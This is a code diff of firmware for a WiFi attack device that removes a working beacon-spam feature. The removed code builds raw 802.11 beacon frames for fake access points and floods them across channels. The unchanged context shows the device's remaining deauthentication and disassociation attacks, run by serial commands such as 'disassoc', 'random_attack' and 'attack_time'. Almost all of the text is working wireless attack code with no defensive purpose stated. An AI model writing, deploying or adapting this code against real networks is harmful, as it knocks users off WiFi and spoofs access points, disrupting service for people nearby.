@@ -66,34 +66,6 @@ unsigned long attackDuration  = 10000; // default 10 seconds
 // Frame Structures
 //==========================================================
 typedef struct {
-  // IEEE 802.11 Management Frame Header
-  uint16_t frame_control;      // Frame Control: 0x8000 for Beacon
-  uint16_t duration;           // Duration: 0x0000
-  uint8_t destination[6];     // Destination MAC: Broadcast (FF:FF:FF:FF:FF:FF)
-  uint8_t source[6];          // Source MAC: Fake AP MAC
-  uint8_t bssid[6];           // BSSID: Same as Source MAC
-  uint16_t sequence_number;    // Sequence Control: 0x0000
-
-  // Beacon Frame Body
-  uint64_t timestamp;          // Timestamp: 0x0000000000000000
-  uint16_t beacon_interval;    // Beacon Interval: 0x0064 (100 TU)
-  uint16_t capability_info;    // Capability Information: 0x0021 (ESS, Privacy)
-
-  // Information Elements (IEs)
-  uint8_t ssid_tag;            // SSID IE Tag Number: 0x00
-  uint8_t ssid_length;         // SSID Length
-  uint8_t ssid[32];            // SSID: Up to 32 bytes
-
-  uint8_t supported_rates_tag; // Supported Rates IE Tag Number: 0x01
-  uint8_t supported_rates_length; // Supported Rates Length: 0x08
-  uint8_t supported_rates[8];  // Supported Rates: Example Rates
-
-  uint8_t ds_parameter_set_tag; // DS Parameter Set IE Tag Number: 0x03
-  uint8_t ds_parameter_set_length; // DS Parameter Set Length: 0x01
-  uint8_t current_channel;      // Current Channel: 1-14 for 2.4GHz, 36-165 for 5GHz
-} BeaconFrame;
-
-typedef struct {
   uint16_t frame_control = 0xC0;  // Deauth
   uint16_t duration = 0xFFFF;
   uint8_t destination[6];
@@ -149,7 +121,6 @@ extern "C" int wifi_get_mac_address(char *mac);
 void wifi_tx_raw_frame(void* frame, size_t length);
 void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason = 0x06);
 void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason = 0x08);
-void wifi_tx_beacon_frame(const void* src_mac, const void* dst_mac, const char *ssid);
 
 int scanNetworks();
 void printScanResults();
@@ -165,13 +136,6 @@ void checkTimedAttack();
 //==========================================================
 std::vector<WiFiScanResult> scan_results;
 std::vector<WiFiScanResult> target_aps;
-
-//==========================================================
-// Beacon Spam Control
-//==========================================================
-bool beacon_spam_enabled        = false;  // If true, spam continuously
-unsigned long beacon_spam_interval = 300;   // Interval in ms
-unsigned long last_beacon_spam   = 0;
 
 //==========================================================
 // Disassociation Attack Control
@@ -217,63 +181,6 @@ void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t r
   memcpy(&frame.destination, dst_mac, 6);
   frame.reason = reason;
   wifi_tx_raw_frame((void*)&frame, sizeof(DisassocFrame));
-}
-
-//==========================================================
-// Beacon Frame (Fake AP)
-//==========================================================
-void wifi_tx_beacon_frame(const void* src_mac, const void* dst_mac, const char *ssid) {
-  BeaconFrame frame;
-
-  // Initialize Frame Control: Management frame (00), Beacon subtype (1000)
-  frame.frame_control = 0x8000; // 0x80 for Beacon, 0x00 for Type Management
-
-  // Duration
-  frame.duration = 0x0000;
-
-  // Destination MAC: Broadcast
-  memcpy(&frame.destination, dst_mac, 6);
-
-  // Source MAC and BSSID: Fake AP MAC
-  memcpy(&frame.source, src_mac, 6);
-  memcpy(&frame.bssid, src_mac, 6);
-
-  // Sequence Control
-  frame.sequence_number = 0x0000;
-
-  // Timestamp
-  frame.timestamp = 0x0000000000000000;
-
-  // Beacon Interval
-  frame.beacon_interval = 0x0064; // 100 TU
-
-  // Capability Information
-  frame.capability_info = 0x0021; // ESS, Privacy
-
-  // SSID IE
-  frame.ssid_tag = 0x00; // SSID IE
-  size_t ssid_len = strlen(ssid);
-  if(ssid_len > 32) ssid_len = 32; // Limit SSID to 32 bytes
-  frame.ssid_length = ssid_len;
-  memset(frame.ssid, 0, 32);
-  memcpy(frame.ssid, ssid, ssid_len);
-
-  // Supported Rates IE
-  frame.supported_rates_tag = 0x01; // Supported Rates IE
-  frame.supported_rates_length = 0x08; // Length of Supported Rates
-  uint8_t rates[] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24}; // Example Rates: 1, 2, 5.5, 11, 6, 9, 12, 18 Mbps
-  memcpy(frame.supported_rates, rates, 8);
-
-  // DS Parameter Set IE
-  frame.ds_parameter_set_tag = 0x03; // DS Parameter Set IE
-  frame.ds_parameter_set_length = 0x01; // DS Parameter Set Length
-  frame.current_channel = start_channel; // Current Channel
-
-  // Calculate total frame size
-  size_t frame_size = sizeof(BeaconFrame);
-
-  // Send the raw frame
-  wifi_tx_raw_frame((void*)&frame, frame_size);
 }
 
 //==========================================================
@@ -407,7 +314,6 @@ void handleCommand(String command) {
     // Unified stop command: Stops all active attacks
     attack_enabled = false;
     disassoc_enabled = false;
-    beacon_spam_enabled = false;
     Serial.println("[INFO] All attacks stopped.");
   }
   else if(command.equalsIgnoreCase("scan")) {
@@ -456,32 +362,6 @@ void handleCommand(String command) {
     }
     else {
       Serial.println("[INFO] Disassociation Attack is already running.");
-    }
-  }
-
-  //==========================
-  // Beacon Spam Commands (Start Only)
-  //==========================
-  else if(command.equalsIgnoreCase("beacon_spam")) {
-    if(!beacon_spam_enabled) {
-      beacon_spam_enabled = true;
-      Serial.println("[INFO] Continuous Beacon Spam started.");
-    }
-    else {
-      Serial.println("[INFO] Beacon Spam is already running.");
-    }
-  }
-
-  else if(command.startsWith("beacon_spam interval ")) {
-    // e.g., "beacon_spam interval 500"
-    String valStr = command.substring(String("beacon_spam interval ").length());
-    unsigned long intervalMs = valStr.toInt();
-    if(intervalMs > 0) {
-      beacon_spam_interval = intervalMs;
-      Serial.println("[INFO] Beacon spam interval set to " + String(intervalMs) + " ms.");
-    }
-    else {
-      Serial.println("[ERROR] Invalid interval value.");
     }
   }
 
@@ -645,8 +525,6 @@ void handleCommand(String command) {
     Serial.println("- scan: Perform a WiFi scan and display results.");
     Serial.println("- results: Show last scan results.");
     Serial.println("- disassoc: Begin continuous disassociation attacks.");
-    Serial.println("- beacon_spam: Begin continuous beacon spam.");
-    Serial.println("- beacon_spam interval <ms>: Set interval for beacon spam (default: 300 ms).");
     Serial.println("- random_attack: Deauth a randomly chosen AP from the scan list.");
     Serial.println("- attack_time <ms>: Start a timed attack for the specified duration.");
     Serial.println("- set <key> <value>: Update configuration settings.");
@@ -801,49 +679,6 @@ void loop() {
       }
     }
     last_cycle = millis();
-  }
-
-  //===============================
-  // CONTINUOUS BEACON SPAM
-  //===============================
-  if(beacon_spam_enabled && (millis() - last_beacon_spam >= beacon_spam_interval)) {
-    last_beacon_spam = millis();
-
-    // Retrieve device MAC
-    rtw_mac_t my_mac;
-    if(wifi_get_mac_address(reinterpret_cast<char*>(my_mac.octet)) == RTW_SUCCESS) {
-      // Rotate channels for broader coverage
-      static uint8_t current_spam_channel = start_channel;
-      wifi_set_channel(current_spam_channel);
-
-      // Generate a unique SSID by appending a counter
-      static unsigned long spam_counter = 0;
-      const char* base_ssid = "FakeAP_";
-      char ssid_buffer[32];
-      snprintf(ssid_buffer, sizeof(ssid_buffer), "%s%lu", base_ssid, spam_counter++);
-
-      // Send beacon frame
-      wifi_tx_beacon_frame(my_mac.octet, dst_mac, ssid_buffer);
-
-      // Rotate channel for next spam
-      current_spam_channel++;
-      if(current_spam_channel > 14) { // Assuming 2.4GHz
-        current_spam_channel = 1;
-      }
-
-      // Optional LED feedback
-      if(USE_LED) {
-        digitalWrite(LED_G, HIGH);
-        delay(50);
-        digitalWrite(LED_G, LOW);
-      }
-
-      // Print once each spam cycle
-      Serial.println("[BEACON SPAM] Sent beacon: " + String(ssid_buffer) + " on channel " + String(current_spam_channel));
-    }
-    else {
-      Serial.println("[ERROR] Could not retrieve device MAC for beacon spam.");
-    }
   }
 
   //===============================
